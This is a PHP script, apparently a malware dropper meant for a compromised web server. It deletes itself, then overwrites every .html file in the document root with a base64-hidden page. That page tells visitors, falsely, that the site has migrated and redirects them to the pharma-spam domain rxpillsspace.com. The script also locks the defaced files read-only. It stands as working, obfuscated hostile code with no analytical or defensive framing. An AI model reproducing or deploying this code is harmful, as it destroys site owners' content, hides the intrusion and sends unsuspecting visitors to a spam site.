<?php unlink(__FILE__); 


$x_domains = explode(',' ,  "rxpillsspace.com");

$ggg = base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ0FDSEUtQ09OVFJPTCIgQ09OVEVOVD0iTk8tQ0FDSEUiPg0KPE1FVEEgSFRUUC1FUVVJVj0iUFJBR01BIiBDT05URU5UPSJOTy1DQUNIRSI+DQo8c3R5bGU+DQpib2R5IHsgbWFyZ2luOiAyMDBweDsgZm9udDogMTJwdCBoZWx2ZXRpY2E7IH0NCjwvc3R5bGU+DQoNCjwvaGVhZD4NCjxib2R5Pg0KDQo8L2JvZHk+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQoNCg0KLy8gRWRpdCB0aGVzZSB0byBzdWl0IHlvdXIgbmVlZHMuDQp2YXIgb2xkc2l0ZSA9ICJodHRwOi8vIyNET01BSU4jIyI7DQp2YXIgbmV3U2l0ZSA9ICJodHRwOi8vIyNET01BSU4jIyI7DQp2YXIgc2Vjb25kcyA9IDE7ICAvLyBjb3VudGRvd24gZGVsYXkuDQoNCnZhciBwYXRoID0gbG9jYXRpb24ucGF0aG5hbWU7DQp2YXIgc3JjaCA9IGxvY2F0aW9uLnNlYXJjaDsNCnZhciB1bmlxID0gTWF0aC5mbG9vcigoTWF0aC5yYW5kb20oKSAqIDEwMDAwKSArIDEpOw0KdmFyIG5ld1BhdGggPSBuZXdTaXRlIDsgDQoNCg0KZG9jdW1lbnQud3JpdGUgKCc8cD5BcyBwYXJ0IG9mIGhvc3RpbmcgaW1wcm92ZW1lbnRzLCB0aGUgc3lzdGVtIGhhcyBiZWVuIG1pZ3JhdGVkIGZyb20gJyArIG9sZHNpdGUgKyAnIHRvPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cD48YSBocmVmPSInICsgbmV3UGF0aCArICciPicgKyBuZXdTaXRlICsgJzwvYT48L3A+Jyk7DQpkb2N1bWVudC53cml0ZSAoJzxwPlBsZWFzZSB0YWtlIG5vdGUgb2YgdGhlIG5ldyB3ZWJzaXRlIGFkZHJlc3MuPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cD5JZiB5b3UgYXJlIG5vdCBhdXRvbWF0aWNhbGx5IHJlZGlyZWN0ZWQgcGxlYXNlIGNsaWNrIHRoZSBsaW5rIGFib3ZlIHRvIHByb2NlZWQuPC9wPicpOw0KZG9jdW1lbnQud3JpdGUgKCc8cCBpZD0iZHZDb3VudERvd24iPllvdSB3aWxsIGJlIHJlZGlyZWN0ZWQgYWZ0ZXIgPHNwYW4gaWQgPSAibGJsQ291bnQiPjwvc3Bhbj4mbmJzcDtzZWNvbmRzLjwvcD4nKTsNCg0KZnVuY3Rpb24gRGVsYXlSZWRpcmVjdCgpIHsNCiAgICB2YXIgZHZDb3VudERvd24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHZDb3VudERvd24iKTsNCiAgICB2YXIgbGJsQ291bnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibGJsQ291bnQiKTsNCiAgICBkdkNvdW50RG93bi5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsNCiAgICBsYmxDb3VudC5pbm5lckhUTUwgPSBzZWNvbmRzOw0KICAgIHNldEludGVydmFsKGZ1bmN0aW9uICgpIHsNCiAgICAgICAgc2Vjb25kcy0tOw0KICAgICAgICBsYmxDb3VudC5pbm5lckhUTUwgPSBzZWNvbmRzOw0KICAgICAgICBpZiAoc2Vjb25kcyA9PSAwKSB7DQogICAgICAgICAgICBkdkNvdW50RG93bi5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uID0gbmV3UGF0aDsNCiAgICAgICAgfQ0KICAgIH0sIDEwMCk7DQp9DQpEZWxheVJlZGlyZWN0KCkNCg0KPC9zY3JpcHQ+DQo8L2h0bWw+DQoNCg==");

$ggg = base64_encode(str_replace( '##DOMAIN##', $x_domains[array_rand($x_domains)] , $ggg ));


$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

//echo $path . PHP_EOL;

$root = $path;




$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;

foreach(glob($root . '/*.html') as $fname) {
//   echo $fname . PHP_EOL;


$files_changed++;
//echo  'INDEX.PHP PATCHED--1111111' . PHP_EOL;

$filepath=$fname;
$basename = preg_replace('/^.+[\\\\\\/]/', '', $filepath);
//echo $basename;


chmod($fname, 0644);


file_put_contents($fname, base64_decode($ggg));
$fp = fopen($fname , 'w');
fwrite($fp, base64_decode($ggg));
fclose($fp);
chmod($fname, 0444);



//echo file_get_contents($fname);

//echo $shell_url . '/' . $basename . PHP_EOL ;
//break;


}



//echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 

